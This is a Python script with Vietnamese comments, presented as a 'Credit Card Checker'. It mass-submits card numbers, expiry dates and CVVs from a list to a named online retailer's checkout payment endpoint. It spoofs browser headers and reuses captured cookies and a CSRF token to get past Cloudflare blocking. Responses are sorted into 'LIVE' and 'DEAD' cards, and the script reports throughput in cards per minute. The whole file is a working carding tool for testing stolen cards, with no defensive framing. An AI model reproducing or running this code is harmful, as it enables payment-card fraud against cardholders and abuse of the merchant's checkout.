#!/usr/bin/env python3
"""
Credit Card Checker - Simple Version
Đơn giản hóa, chỉ cần update cookies 1 lần
"""

import time
import json
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Tuple
import urllib.parse
import requests


class CardChecker:
    def __init__(self, cookies_file: str = None, csrf_token: str = None, threads: int = 5):
        """
        Khởi tạo CardChecker
        
        Args:
            cookies_file: File chứa cookies (format: key=value; key2=value2)
            csrf_token: CSRF token
            threads: Số luồng
        """
        self.threads = threads
        self.session = requests.Session()
        
        # Headers
        self.session.headers.update({
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.pipesandcigars.com',
            'referer': 'https://www.pipesandcigars.com/checkout',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        })
        
        self.url = 'https://www.pipesandcigars.com/on/demandware.store/Sites-PC-Site/default/CheckoutServices-SubmitPayment'
        self.csrf_token = csrf_token or ''
        
        # Load cookies nếu có
        if cookies_file:
            self.load_cookies(cookies_file)
    
    def load_cookies(self, cookies_file: str):
        """Load cookies từ file"""
        try:
            with open(cookies_file, 'r') as f:
                cookie_string = f.read().strip()
            
            # Parse cookies
            for item in cookie_string.split('; '):
                if '=' in item:
                    key, value = item.split('=', 1)
                    self.session.cookies.set(key.strip(), value.strip())
            
            print(f"[✓] Đã load {len(self.session.cookies)} cookies từ {cookies_file}")
        except Exception as e:
            print(f"[!] Lỗi load cookies: {e}")
    
    def parse_card(self, card_line: str) -> Dict[str, str]:
        """Parse thông tin thẻ"""
        card_line = card_line.strip()
        if not card_line or card_line.startswith('#'):
            return None
            
        parts = card_line.split('|')
        if len(parts) < 3:
            return None
            
        card_number = parts[0].strip().replace(' ', '')
        
        # Parse exp date
        if '/' in parts[1]:
            exp_parts = parts[1].split('/')
            exp_month = exp_parts[0].strip().zfill(2)
            exp_year = exp_parts[1].strip()
            cvv = parts[2].strip() if len(parts) > 2 else ''
        else:
            exp_month = parts[1].strip().zfill(2)
            exp_year = parts[2].strip() if len(parts) > 2 else ''
            cvv = parts[3].strip() if len(parts) > 3 else ''
        
        # Đảm bảo exp_year có 4 chữ số
        if len(exp_year) == 2:
            exp_year = '20' + exp_year
            
        # Xác định loại thẻ
        if card_number.startswith('4'):
            card_type = 'Visa'
        elif card_number.startswith('5'):
            card_type = 'Master Card'
        elif card_number.startswith('3'):
            card_type = 'American Express'
        else:
            card_type = 'Unknown'
        
        # Parse billing info nếu có
        billing = {}
        if len(parts) >= 11:
            billing = {
                'name': parts[4].strip(),
                'address': parts[5].strip(),
                'city': parts[6].strip(),
                'state': parts[7].strip(),
                'zip': parts[8].strip(),
                'country': parts[9].strip(),
                'phone': parts[10].strip()
            }
            
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv,
            'type': card_type,
            'billing': billing
        }
    
    def build_payload(self, card: Dict[str, str]) -> str:
        """Tạo payload"""
        billing = card.get('billing', {})
        
        # Split name
        name = billing.get('name', 'Michael Johnson')
        name_parts = name.split()
        first_name = name_parts[0] if name_parts else 'Michael'
        last_name = name_parts[-1] if len(name_parts) > 1 else 'Johnson'
        
        data = {
            'dwfrm_billing_addressFields_typeID': 'useShippingAddress',
            'dwfrm_billing_addressFields_addressNickname': first_name,
            'dwfrm_billing_addressFields_firstName': first_name,
            'dwfrm_billing_addressFields_lastName': last_name,
            'dwfrm_billing_addressFields_companyName': '',
            'dwfrm_billing_addressFields_address1': billing.get('address', '350 5th Ave'),
            'dwfrm_billing_addressFields_address2': '',
            'dwfrm_billing_addressFields_city': billing.get('city', 'New York'),
            'dwfrm_billing_addressFields_country': billing.get('country', 'US'),
            'dwfrm_billing_addressFields_states_stateCode': billing.get('state', 'NY'),
            'dwfrm_billing_addressFields_isBilling': 'true',
            'dwfrm_billing_addressFields_postalCode': billing.get('zip', '10118'),
            'dwfrm_billing_contactInfoFields_phone': billing.get('phone', '2175551234'),
            'dwfrm_billing_addressFields_phoneNumberExtension': '',
            'dwfrm_billing_addressFields_residentialOrBusiness': 'Residential',
            'csrf_token': self.csrf_token,
            'localizedNewAddressTitle': 'new',
            'dwfrm_billing_paymentMethod': 'CREDIT_CARD',
            'dwfrm_billing_creditCardFields_cardType': card['type'],
            'dwfrm_billing_creditCardFields_cardNumber': card['number'],
            'dwfrm_billing_creditCardFields_expirationMonth': card['exp_month'],
            'dwfrm_billing_creditCardFields_expirationYear': card['exp_year'],
            'dwfrm_billing_creditCardFields_securityCode': card['cvv'],
        }
        
        return urllib.parse.urlencode(data)
    
    def check_card(self, card: Dict[str, str]) -> Tuple[str, str, str]:
        """Kiểm tra thẻ"""
        card_info = f"{card['number']}|{card['exp_month']}/{card['exp_year']}|{card['cvv']}"
        
        try:
            payload = self.build_payload(card)
            response = self.session.post(self.url, data=payload, timeout=30)
            
            status_code = response.status_code
            
            if status_code == 200:
                try:
                    data = response.json()
                    
                    # Check success
                    if data.get('success') == True or data.get('action') == 'success':
                        return (card_info, 'LIVE', '✓ Approved')
                    
                    # Check error
                    error = data.get('error') or data.get('errorMessage') or data.get('message') or ''
                    
                    if error:
                        error_lower = error.lower()
                        if any(x in error_lower for x in ['declined', 'invalid', 'incorrect', 'failed']):
                            return (card_info, 'DEAD', f'✗ {error[:80]}')
                        else:
                            return (card_info, 'UNKNOWN', f'? {error[:80]}')
                    
                    # Check response text
                    text = response.text.lower()
                    if 'success' in text or 'approved' in text:
                        return (card_info, 'LIVE', '✓ Approved')
                    elif 'declined' in text or 'invalid' in text:
                        return (card_info, 'DEAD', '✗ Declined')
                    else:
                        return (card_info, 'UNKNOWN', f'? {response.text[:80]}')
                        
                except:
                    text = response.text.lower()
                    if 'success' in text:
                        return (card_info, 'LIVE', '✓ Approved')
                    elif 'declined' in text or 'invalid' in text:
                        return (card_info, 'DEAD', '✗ Declined')
                    else:
                        return (card_info, 'UNKNOWN', f'? {response.text[:80]}')
            
            elif status_code == 403:
                return (card_info, 'ERROR', '! Cloudflare blocked - Update cookies!')
            else:
                return (card_info, 'ERROR', f'! HTTP {status_code}')
                
        except Exception as e:
            return (card_info, 'ERROR', f'! {str(e)[:50]}')
    
    def check_cards(self, input_file: str, output_file: str = None):
        """Check danh sách thẻ"""
        print(f"\n{'='*70}")
        print(f"CARD CHECKER")
        print(f"{'='*70}")
        print(f"[*] File: {input_file}")
        
        # Đọc thẻ
        cards = []
        with open(input_file, 'r') as f:
            for line in f:
                card = self.parse_card(line)
                if card:
                    cards.append(card)
        
        total = len(cards)
        print(f"[*] Tổng: {total} thẻ")
        print(f"[*] Luồng: {self.threads}")
        print(f"{'='*70}\n")
        
        # Results
        results = {'live': [], 'dead': [], 'unknown': [], 'error': []}
        checked = 0
        start_time = time.time()
        
        # Check
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_card, card): card for card in cards}
            
            for future in as_completed(futures):
                card_info, status, message = future.result()
                checked += 1
                
                # Display
                print(f"{message:50} | {card_info}")
                
                # Save
                results[status.lower()].append({'card': card_info, 'message': message})
                
                # Progress
                elapsed = time.time() - start_time
                rate = checked / elapsed if elapsed > 0 else 0
                print(f"  [{checked}/{total}] {checked*100//total}% | {rate*60:.0f} cpm\n")
        
        # Summary
        print(f"{'='*70}")
        print(f"TỔNG KẾT")
        print(f"{'='*70}")
        print(f"✓ LIVE   : {len(results['live'])}")
        print(f"✗ DEAD   : {len(results['dead'])}")
        print(f"? UNKNOWN: {len(results['unknown'])}")
        print(f"! ERROR  : {len(results['error'])}")
        print(f"Thời gian: {time.time() - start_time:.1f}s")
        print(f"Tốc độ  : {total/(time.time() - start_time)*60:.0f} cards/phút")
        print(f"{'='*70}")
        
        # Save
        if output_file:
            self.save_results(results, output_file)
            print(f"\n[✓] Đã lưu: {output_file}")
        
        return results
    
    def save_results(self, results: Dict, output_file: str):
        """Lưu kết quả"""
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"# Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for status in ['live', 'dead', 'unknown', 'error']:
                items = results[status]
                f.write(f"# {status.upper()} ({len(items)})\n")
                for item in items:
                    f.write(f"{item['card']} | {item['message']}\n")
                f.write("\n")


def main():
    parser = argparse.ArgumentParser(description='Card Checker - Simple Version')
    parser.add_argument('-i', '--input', required=True, help='File danh sách thẻ')
    parser.add_argument('-o', '--output', help='File lưu kết quả')
    parser.add_argument('-c', '--cookies', help='File chứa cookies')
    parser.add_argument('--csrf', help='CSRF token')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Số luồng (default: 5)')
    
    args = parser.parse_args()
    
    # Kiểm tra cookies
    if not args.cookies:
        print("\n[!] CẢNH BÁO: Chưa có cookies, có thể bị Cloudflare chặn!")
        print("[!] Sử dụng: -c cookies.txt --csrf 'token'\n")
    
    checker = CardChecker(
        cookies_file=args.cookies,
        csrf_token=args.csrf,
        threads=args.threads
    )
    
    checker.check_cards(args.input, args.output)


if __name__ == '__main__':
    main()
